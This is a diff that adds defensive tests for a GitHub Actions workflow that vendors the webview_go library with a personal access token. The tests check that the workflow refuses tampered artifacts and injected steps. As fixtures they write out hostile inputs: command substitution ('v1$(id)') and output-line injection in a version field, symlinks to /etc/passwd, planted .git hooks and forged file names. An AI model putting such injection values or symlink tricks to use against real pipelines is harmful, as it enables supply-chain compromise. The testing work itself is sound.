+    else if (JSON.stringify(code(st.run)) !== JSON.stringify(w.run)) out.push(label + " runs a script other than the listed one: " + JSON.stringify(code(st.run).filter((l, n) => l !== w.run[n])));
+  } else if (st.run !== undefined) out.push(label + " runs a script");
+  const env = Object.keys(st.env ?? {});
+  if (JSON.stringify(env) !== JSON.stringify(w.env ?? [])) out.push(label + " has env " + JSON.stringify(env) + ", not " + JSON.stringify(w.env ?? []));
+});
+if (out.length) console.log(out.join("\n"));
+'
+}
+found="$(pat_job_check "$WORKFLOWS/update-webview.yml")" || found="the bun helper failed"
+if [ -z "$found" ]; then ok "update-webview.yml: the job holding the PAT runs exactly its listed steps (review of #983)"; else no "update-webview.yml: the job holding the PAT runs exactly its listed steps (review of #983)" "$found"; fi
+# pat_job_caught <label> <exact text> <replacement> <reason>
+pat_job_caught() {
+	local copy="${WORK}/pat-job.yml"
+	if ! FROM="$WORKFLOWS/update-webview.yml" TO="$copy" OLD="$2" NEW="$3" bun -e '
+const s = await Bun.file(process.env.FROM).text();
+if (!s.includes(process.env.OLD)) process.exit(2);
+await Bun.write(process.env.TO, s.replace(process.env.OLD, () => process.env.NEW));
+'; then
+		no "PAT job mutant '$1' could be applied (update-webview.yml no longer has the text it mutates)"
+		return
+	fi
+	found="$(pat_job_check "$copy")" || found="the bun helper failed"
+	if grep -qF -- "$4" <<<"$found"; then ok "reports: $1"; else no "reports: $1, for the reason it exists" "wanted '${4}', got: ${found}"; fi
+}
+# shellcheck disable=SC2016 # literal workflow text, not shell.
+{
+	pat_job_caught 'the artifact run by a step added to the job holding the PAT (review of #983)' \
+		'      - name: Open / update the bump PR' $'      - run: bash "$RUNNER_TEMP/webview-bump/webview_go/build.sh"\n      - name: Open / update the bump PR' \
+		'publish: runs 6 steps, not the 5 listed'
+	pat_job_caught 'the artifact run from inside the copy step (review of #983)' \
+		'          cp "$in/go.mod" "$in/go.sum" sidecar/' $'          cp "$in/go.mod" "$in/go.sum" sidecar/\n          bash "$in/webview_go/build.sh" || true' \
+		'publish: step Put the vendored tree in place runs a script other than the listed one'
+	pat_job_caught 'make run in place of the copy (review of #983)' \
+		'          rm -rf sidecar/third_party/webview_go' '          make -C sidecar' \
+		'runs a script other than the listed one'
+	pat_job_caught 'an action of another name in the job holding the PAT (review of #983)' \
+		'        uses: peter-evans/create-pull-request@' '        uses: evil/create-pull-request@' \
+		'publish: step Open / update the bump PR is not peter-evans/create-pull-request@'
+	pat_job_caught 'the copy run from another directory (review of #983)' \
+		$'      - name: Put the vendored tree in place\n' $'      - name: Put the vendored tree in place\n        working-directory: scripts\n' \
+		'publish: step Put the vendored tree in place has working-directory:'
+	pat_job_caught 'env for every step of the job holding the PAT (review of #983)' \
+		$'    timeout-minutes: 15\n    permissions:\n      contents: read\n    steps:\n      # Refuse' $'    timeout-minutes: 15\n    env:\n      GOFLAGS: -mod=mod\n    permissions:\n      contents: read\n    steps:\n      # Refuse' \
+		'publish: has env:'
+}
+# A job that runs past timeout-minutes is cancelled, not failed, so the
+# report job takes a cancelled build or publish too (review of #983).
+report_check() {
+	# shellcheck disable=SC2016 # JavaScript source, not shell.
+	FILE="$1" bun -e '
+const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
+const c = String(d.jobs?.report?.if ?? "");
+for (const j of ["build", "publish"]) for (const r of ["failure", "cancelled"])
+  if (!c.includes("needs." + j + ".result") || !c.includes(r)) { console.log("the report job does not run on a " + r + " " + j + ": " + c); }
+if (!/^always\(\) && /.test(c)) console.log("the report job if: does not start with always(), so a cancelled job skips it: " + c);
+'
+}
+found="$(report_check "$WORKFLOWS/update-webview.yml")" || found="the bun helper failed"
+if [ -z "$found" ]; then ok "update-webview.yml: a failed or timed-out bump files the tracking issue (review of #983)"; else no "update-webview.yml: a failed or timed-out bump files the tracking issue (review of #983)" "$found"; fi
+copy="${WORK}/report.yml"
+# shellcheck disable=SC2016 # literal workflow text, not shell.
+if FROM="$WORKFLOWS/update-webview.yml" TO="$copy" bun -e '
+const s = await Bun.file(process.env.FROM).text();
+const m = /    if: always\(\) && needs\.check\.outputs\.changed == .true. && .*\n/.exec(s);
+if (!m) process.exit(2);
+await Bun.write(process.env.TO, s.replace(m[0], () => "    if: failure() && needs.check.outputs.changed == \x27true\x27\n"));
+' && grep -qF 'does not start with always()' <<<"$(report_check "$copy")"; then
+	ok "reports: the report job back on failure() alone, which a timeout skips (review of #983)"
+else
+	no "reports: the report job back on failure() alone, which a timeout skips (review of #983)"
+fi
+# check, executed verbatim with a dispatch input (so nothing is fetched):
+# the pinned version, which the build job writes into the PR, is held to the
+# same alphabet as the new one (security review of #983).
+CHECK_STEP="$(FILE="$WORKFLOWS/update-webview.yml" bun -e '
+const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
+const st = (d.jobs?.check?.steps ?? []).find((s) => s.id === "cmp");
+if (!st || typeof st.run !== "string") process.exit(2);
+process.stdout.write(st.run);
+')" || CHECK_STEP=""
+# check_case <label> <ok|refused> <pinned version file content>
+check_case() {
+	local d="${WORK}/wvcheck" rc=0
+	rm -rf "$d" && mkdir -p "$d/ws/sidecar/third_party/webview_go"
+	printf '%s' "$3" >"$d/ws/sidecar/third_party/webview_go/UPSTREAM_VERSION"
+	: >"$d/out"
+	(cd "$d/ws" && env -i PATH="$PATH" GITHUB_OUTPUT="$d/out" INPUT_VERSION=v0.0.0-20260101000000-abcdef123456 MODULE=github.com/webview/webview_go bash -e -c "${CHECK_STEP_UNDER_TEST:-$CHECK_STEP}") >"$d/log" 2>&1 || rc=$?
+	local ok_=0
+	case "$2" in
+	ok) [ "$rc" -eq 0 ] && grep -qxF 'changed=true' "$d/out" && grep -qxF "current=$3" "$d/out" && ok_=1 ;;
+	refused) [ "$rc" -ne 0 ] && ! grep -q '^changed=' "$d/out" && ok_=1 ;;
+	esac
+	if [ "$ok_" = 1 ]; then ok "webview check: $1"; else no "webview check: $1" "exit ${rc}; out: $(cat "$d/out"); log: $(cat "$d/log")"; fi
+}
+if [ -z "$CHECK_STEP" ]; then
+	no "found update-webview.yml check: cmp"
+else
+	check_case 'a plain pinned version is read' ok 'v0.0.0-20240101000000-0123456789ab'
+	check_case 'a pinned version carrying another output line is refused' refused $'v1\nchanged=false'
+	check_case 'a pinned version with shell text in it is refused' refused 'v1$(id)'
+	check_case 'an empty pinned version is refused' refused ''
+	mutated="$(SRC="$CHECK_STEP" bun -e '
+const s = process.env.SRC;
+const m = /case "\$current" in\n[^\n]*\nesac\n/.exec(s);
+if (!m) process.exit(2);
+process.stdout.write(s.replace(m[0], () => ""));
+')" || mutated=""
+	if [ -z "$mutated" ]; then
+		no "webview check mutant could be applied (the step no longer has the text it mutates)"
+	elif grep -q "^  FAIL" <<<"$(CHECK_STEP_UNDER_TEST="$mutated" check_case 'a pinned version carrying another output line is refused' refused $'v1\nchanged=false')"; then
+		ok "reports: the pinned version taken unchecked again (security review of #983)"
+	else
+		no "reports: the pinned version taken unchecked again (security review of #983)" "the case passed a step with this hole"
+	fi
+fi
+# The copy into the checkout, executed verbatim against artifacts shaped as
+# a job running upstream code could shape them. Each case runs in a fixture
+# workspace of its own; an accepted artifact must replace the vendor dir
+# exactly (a file upstream dropped is dropped, the hidden one kept), and a
+# refused one must fail with an ::error:: and leave the checkout untouched.
+COPY_STEP="$(FILE="$WORKFLOWS/update-webview.yml" bun -e '
+const d = Bun.YAML.parse(await Bun.file(process.env.FILE).text());
+const st = (d.jobs?.publish?.steps ?? []).find((s) => s.name === "Put the vendored tree in place");
+if (!st || typeof st.run !== "string") process.exit(2);
+process.stdout.write(st.run);
+')" || COPY_STEP=""
+# copy_case <label> <ok|refused> <shell run in the artifact dir to shape it>
+copy_case() {
+	local label="$1" want="$2" shape="$3" d="${WORK}/wvcopy"
+	rm -rf "$d" && mkdir -p "$d/ws/sidecar/third_party/webview_go/libs" "$d/tmp/webview-bump/webview_go/libs/webview"
+	printf 'old\n' >"$d/ws/sidecar/third_party/webview_go/dropped.go"
+	printf 'old attrs\n' >"$d/ws/sidecar/third_party/webview_go/.gitattributes"
+	printf 'module old\n' >"$d/ws/sidecar/go.mod"
+	printf 'old sum\n' >"$d/ws/sidecar/go.sum"
+	printf 'package webview\n' >"$d/tmp/webview-bump/webview_go/webview.go"
+	printf '* -text\n' >"$d/tmp/webview-bump/webview_go/.gitattributes"
+	printf 'v1.2.3\n' >"$d/tmp/webview-bump/webview_go/UPSTREAM_VERSION"
+	printf 'header\n' >"$d/tmp/webview-bump/webview_go/libs/webview/webview.h"
+	printf 'module new\n' >"$d/tmp/webview-bump/go.mod"
+	printf 'new sum\n' >"$d/tmp/webview-bump/go.sum"
+	(cd "$d/tmp/webview-bump" && eval "$shape") || {
+		no "webview copy: ${label} (the fixture could not be shaped)"
+		return
+	}
+	cp -R "$d/ws" "$d/before"
+	local rc=0
+	(cd "$d/ws" && env -i PATH="$PATH" RUNNER_TEMP="$d/tmp" VERSION=v1.2.3 bash -e -c "${COPY_STEP_UNDER_TEST:-$COPY_STEP}") >"$d/log" 2>&1 || rc=$?
+	local ok_=0
+	case "$want" in
+	ok) [ "$rc" -eq 0 ] && diff -r "$d/tmp/webview-bump/webview_go" "$d/ws/sidecar/third_party/webview_go" >/dev/null &&
+		cmp -s "$d/tmp/webview-bump/go.mod" "$d/ws/sidecar/go.mod" && cmp -s "$d/tmp/webview-bump/go.sum" "$d/ws/sidecar/go.sum" && ok_=1 ;;
+	refused) [ "$rc" -ne 0 ] && grep -q '^::error::' "$d/log" && diff -r "$d/before" "$d/ws" >/dev/null && ok_=1 ;;
+	esac
+	if [ "$ok_" = 1 ]; then ok "webview copy: ${label}"; else no "webview copy: ${label}" "exit ${rc}; log: $(cat "$d/log")"; fi
+}
+if [ -z "$COPY_STEP" ]; then
+	no "found update-webview.yml publish: Put the vendored tree in place"
+else
+	copy_case 'the vendored tree replaces the old one, its hidden file kept and a dropped file dropped' ok ':'
+	copy_case 'a link inside the vendored tree is refused' refused 'ln -s /etc/passwd webview_go/libs/evil.h'
+	copy_case 'a module file that is a link is refused' refused 'rm go.sum && ln -s /etc/passwd go.sum'
+	copy_case 'a nested .git directory is refused' refused 'mkdir -p webview_go/libs/.git/hooks && printf x >webview_go/libs/.git/hooks/pre-commit'
+	copy_case 'a .git file is refused' refused 'printf "gitdir: /tmp/x\n" >webview_go/.git'
+	copy_case 'an extra file beside the tree is refused' refused 'printf x >evil.sh'
+	copy_case 'a missing go.sum is refused' refused 'rm go.sum'
+	copy_case 'the vendor dir as a file is refused' refused 'rm -r webview_go && printf x >webview_go'
+	# Review of #983: case, a newline in a name, and the version recorded.
+	copy_case 'a .GIT directory, which a case-insensitive git reads as .git, is refused' refused 'mkdir -p webview_go/libs/.GIT/hooks && printf x >webview_go/libs/.GIT/hooks/post-checkout'
+	copy_case 'a name with a newline in it, faking the listing, is refused' refused 'rm -r webview_go go.mod go.sum && mkdir "$(printf "go.mod f\ngo.sum f\nwebview_go")"'
+	copy_case 'a name with a space in it is refused' refused 'printf x >"webview_go/a b.go"'
+	copy_case 'a tree recording another version is refused' refused 'printf "v9.9.9\n" >webview_go/UPSTREAM_VERSION'
+	copy_case 'a tree recording no version is refused' refused 'rm webview_go/UPSTREAM_VERSION'
+	# copy_mutant <label> <exact text> <replacement> <copy_case arguments...>
+	copy_mutant() {
+		local label="$1" old="$2" new="$3"
+		shift 3
+		local mutated
+		mutated="$(OLD="$old" NEW="$new" SRC="$COPY_STEP" bun -e 'const s = process.env.SRC; if (!s.includes(process.env.OLD)) process.exit(2); process.stdout.write(s.replace(process.env.OLD, () => process.env.NEW));')" || {
+			no "webview copy mutant '${label}' could be applied (the step no longer has the text it mutates)"
+			return
+		}
+		local res; res="$(COPY_STEP_UNDER_TEST="$mutated" copy_case "$@")"; if grep -q "^  FAIL" <<<"$res"; then ok "reports: ${label}"; else no "reports: ${label}" "the case passed a step with this hole"; fi
+	}
+	# shellcheck disable=SC2016 # literal workflow text, not shell.
+	{
+		copy_mutant 'the webview copy taking links (#983)' \
+			'-not -type f -not -type d -print -quit' '-false -print -quit' \
+			'a link inside the vendored tree is refused' refused 'ln -s /etc/passwd webview_go/libs/evil.h'
+		copy_mutant 'the webview copy taking a .git (#983)' \
+			'-iname .git -print -quit' '-iname .nothing -print -quit' \
+			'a nested .git directory is refused' refused 'mkdir -p webview_go/libs/.git/hooks && printf x >webview_go/libs/.git/hooks/pre-commit'
+		copy_mutant 'the webview copy taking any shape of artifact (#983)' \
+			'if [ "$(find "$in" -mindepth 1 -maxdepth 1 | wc -l)" != 3 ] || [ ! -f "$in/go.mod" ] || [ ! -f "$in/go.sum" ] || [ ! -d "$in/webview_go" ]; then' 'if false; then' \
+			'an extra file beside the tree is refused' refused 'printf x >evil.sh'
+		copy_mutant 'the webview copy matching .git in one case only (review of #983)' \
+			'-iname .git -print -quit' '-name .git -print -quit' \
+			'a .GIT directory, which a case-insensitive git reads as .git, is refused' refused 'mkdir -p webview_go/libs/.GIT/hooks && printf x >webview_go/libs/.GIT/hooks/post-checkout'
+		copy_mutant 'the webview copy taking any name (review of #983)' \
+			"-name '*[!A-Za-z0-9._+-]*' -print -quit" '-false -print -quit' \
+			'a name with a space in it is refused' refused 'printf x >"webview_go/a b.go"'
+		copy_mutant 'the webview copy taking a tree of another version (review of #983)' \
+			'!= "$VERSION" ]; then' '= x ]; then' \
+			'a tree recording another version is refused' refused 'printf "v9.9.9\n" >webview_go/UPSTREAM_VERSION'
+	}
+fi
 
 echo
 echo "${pass} passed, ${fail} failed"
